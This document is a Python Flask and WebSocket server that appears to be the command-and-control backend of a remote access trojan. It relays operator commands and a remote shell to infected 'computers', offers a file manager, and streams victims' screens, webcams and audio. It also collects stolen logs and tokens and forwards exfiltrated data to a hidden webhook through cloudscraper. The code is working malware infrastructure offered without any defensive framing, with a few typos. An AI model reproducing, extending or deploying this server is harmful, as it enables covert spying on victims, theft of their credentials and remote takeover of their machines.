import multiprocessing, threading, hashlib, random, json, time, os
import cloudscraper, zipfile, urllib3, flask
from flask import Flask, request, send_file, jsonify
from flask_sock import Sock


scraper = cloudscraper.create_scraper()

app = Flask(__name__)
sock = Sock(app)

_computers = {}
clients = []

shell_computers = {}
shell_clients = {}

files_computers = {}
files_clients = {}

screen_recv_ws = {}
camera_recv_ws = {}
audio_recv_ws = {}

key = os.environ["key"]
connectedComputers = []

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(
                os.path.join(root, file),
                os.path.relpath(os.path.join(root, file), os.path.join(path, "..")),
            )

def send_all_clients(message):
    global clients
    for client in clients:
        try:
            client.send(message)
        except:
            clients.remove(client)

@sock.route("/api/ws/commands")
def commands(ws):
    global _computers
    print("User Connected")
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()

    if not encoded == key:
        print("Client provided invalid key")
        ws.close()

    while True:
        computer = ws.receive()
        if not "|" in computer:
            ws.send("getComputer")
        else:
            break

    _computers[computer] = ws

    send_all_clients( json.dumps( list(_computers.keys()) ) )

    while True:
        try:
            ws.send('ping')
        except:
            print("User Disconnected")
            del _computers[computer]
          
            send_all_clients( json.dumps( list(_computers.keys()) ) )

@sock.route("/api/ws/computers")
def computers(ws):
    global computers, clients
  
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()
    print(encoded)
  
    if not encoded == key:
        ws.close()

    clients.append(ws)

    while True:
        try:
            recv_data = json.loads(ws.receive())
        except:
            clients.remove(ws)
            break

        computer = recv_data['target']
        command = recv_data['code']

        if computer not in _computers:
            continue
          
        _computers[computer].send(command)

@sock.route("/api/ws/readShell")
def readshell(ws):
    global shell_computers, shell_computers
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()
    print(encoded)
    if not encoded == key:
        ws.close()

    computer = ws.receive()

    shell_clients[computer] = ws
  
    while True:
        try:
            command = ws.recieve()
        except:
           del shell_clients[computer]
           break
          
        if computer not in shell_computers:
            continue

        try:
            shell_computers[computer].send(command)
        except:
           del shell_computers[computer]  
           continue

@sock.route("/api/ws/shell")
def shell(ws):
    global shell_computers, shell_computers
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()
    print("SHELL")
    if not encoded == key:
        ws.close()

    computer = ws.receive()

    shell_computers[computer] = ws
  
    while True:
          try:
              response = ws.recieve()
          except:
               del shell_computers[computer]
               break

          if computer not in shell_clients:
             continue

          try:
              shell_clients[computer].send(response)
          except:
              del shell_clients[computer]  
              continue

@sock.route("/api/ws/FileManager")
def readfiles(ws):
    global files_computers, files_computers
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()
    print("SHELL")
    if not encoded == key:
        ws.close()

    computer = ws.receive()

    files_computers[computer] = ws
  
    while True:
          try:
              response = ws.recieve()
          except:
               del files_computers[computer]
               break

          if computer not in files_clients:
             continue

          try:
              files_clients[computer].send(response)
          except:
              del files_clients[computer]  
              continue

@sock.route("/api/ws/files")
def files(ws):
    global files_computers, files_computers
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()
    print("SHELL")
    if not encoded == key:
        ws.close()

    computer = ws.receive()

    files_computers[computer] = ws
  
    while True:
          try:
              response = ws.recieve()
          except:
               del files_computers[computer]
               break

          if computer not in files_clients:
             continue

          try:
              files_clients[computer].send(response)
          except:
              del files_clients[computer]  
              continue
          
@sock.route("/api/ws/camera")
def wscamera(ws):
    global camera_recv_ws
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()

    if not encoded == key:
        ws.close()

    computer = ws.receive()

    if not computer in camera_recv_ws:
        camera_recv_ws[computer] = []

    while True:
        image = ws.receive()
        for _ws in camera_recv_ws[computer]:
            try:
                _ws.send(image)
            except:
                camera_recv_ws[computer].remove(_ws)

@sock.route("/api/ws/screen")
def wsscreen(ws):
    global screen_recv_ws
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()

    if not encoded == key:
        ws.close()

    computer = ws.receive()

    if not computer in screen_recv_ws:
        screen_recv_ws[computer] = []

    while True:
        image = ws.receive()
        for _ws in screen_recv_ws[computer]:
            try:
                _ws.send(image)
            except:
                screen_recv_ws[computer].remove(_ws)

@sock.route("/api/ws/audio")
def wsaudio(ws):
    global audio_recv_ws
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()

    if not encoded == key:
        ws.close()

    computer = ws.receive()

    if not computer in audio_recv_ws:
        audio_recv_ws[computer] = []

    while True:
        image = ws.receive()
        for _ws in audio_recv_ws[computer]:
            try:
                _ws.send(image)
            except Exception as e:
                print(e, "e")
                audio_recv_ws[computer].remove(_ws)

@sock.route("/api/ws/showCamera")
def camera(ws):
    global camera_recv_ws
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()

    if not encoded == key:
        print("Client provided invalid key")
        ws.close()

    computer = ws.receive()

    if not computer in camera_recv_ws:
        camera_recv_ws[computer] = []

    camera_recv_ws[computer].append(ws)
    while True:
        try:
            ws.receive()
        except:
            camera_recv_ws[computer].remove(ws)
            return

@sock.route("/api/ws/showScreen")
def screen(ws):
    global screen_recv_ws
    data = ws.receive()

    encoded = hashlib.sha256(data.encode()).hexdigest()
    if not encoded == key:
        ws.close()

    computer = ws.receive()

    if not computer in screen_recv_ws:
        screen_recv_ws[computer] = []

    screen_recv_ws[computer].append(ws)
    while True:
        try:
            ws.receive()
        except:
            screen_recv_ws[computer].remove(ws)
            return

@sock.route("/api/ws/playAudio")
def audio(ws):
    global audio_recv_ws
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()

    if not encoded == key:
        ws.close()

    computer = ws.receive()

    if not computer in audio_recv_ws:
        audio_recv_ws[computer] = []

    if not computer in screen_recv_ws:
        screen_recv_ws[computer] = []

    audio_recv_ws[computer].append(ws)
    while True:
        try:
            ws.receive()
        except:
            audio_recv_ws[computer].remove(ws)
            return

@app.route("/webhook", methods=["POST", "GET"])
def webhook():
    webhook = os.environ["webhook"]

    if request.environ.get("HTTP_X_FORWARDED_FOR") is None:
        ip = request.environ["REMOTE_ADDR"]
    else:
        ip = request.environ["HTTP_X_FORWARDED_FOR"]

    if request.method == "GET":

        response = scraper.get(webhook).text
        return response

    elif request.method == "POST":
        data = request.form
        try:
            data = dict(request.get_json(force=True))
            is_json = True
        except Exception as e:
            data = dict(request.form)
            is_json = False

        try:
            files = dict(request.files)
        except Exception as e:
            files = {}

        if files:
            try:
                files = {
                    file.filename(): (key, file.read()) for key, file in files.items()
                }
            except Exception as e:
                files = {}
                print(e, 5)

        if is_json:
            response = scraper.post(webhook, json=data, files=files)
        else:
            response = scraper.post(webhook, data=data, files=files)

        print(is_json, data, response.text)
        if response:
            return response.text, response.status_code

        else:
            return {}, 200

@app.route("/logs", methods=["POST", "GET"])
def logs():
    try:
        request.form["key"]
    except:
        print("Client provided invalid key")
        return "", 404

    encoded = hashlib.sha256(request.form["key"].encode()).hexdigest()
    if not encoded == key:
        print("Client provided invalid key")
        return "", 404

    if request.method == "POST":
        log = request.files["file"]
        user = request.form["user"]
        ip = request.form["ip"]

        try:
            dir = f"logs/{user}-{ip}"
            log.save(dir)
        except Exception as e:
            print(e)

        return "", 404

    else:
        with zipfile.ZipFile("temp.zip", "w", zipfile.ZIP_DEFLATED) as zipf:
            zipdir("logs/", zipf)

        data = open("temp.zip", "rb").read()

        return data

@app.route("/tokens", methods=["POST", "GET"])
def tokens():
    try:
        request.form["key"]
    except:
        return "", 404

    encoded = hashlib.sha256(request.form["key"].encode()).hexdigest()
    if not encoded == key:
        return "", 404

    if request.method == "POST":
        keysFile = json.load(open("tokens.json", "rb"))
        token = request.form["token"]

        if token not in keysFile["keys"]:
            with open("tokens.json", "w+") as f:
                keys = keysFile["keys"]
                keys.append(token)
                keysFile["keys"] = keys
                json.dump(keysFile, f, indent=1)
                f.close()

        return "", 204

    elif request.method == "GET":
        keysFile = json.load(open("tokens.json", "r"))

        keys = keysFile["keys"]
        return keys

@app.errorhandler(404)
def page_not_found(e):
    if request.environ.get("HTTP_X_FORWARDED_FOR") is None:
        ip = request.environ["REMOTE_ADDR"]
    else:
        ip = request.environ["HTTP_X_FORWARDED_FOR"]
    print(ip)
    return "", 404

@app.errorhandler(500)
def error(e):
    print(e)
    return "", 404

@app.errorhandler(405)
def notallowed(e):
    print(e)
    return "", 404

@app.errorhandler(400)
def client_error(e):
    print(e, 400)
    return "", 404

if __name__ == "__main__":
    app.run(host="0.0.0.0", debug=True, port=8080)
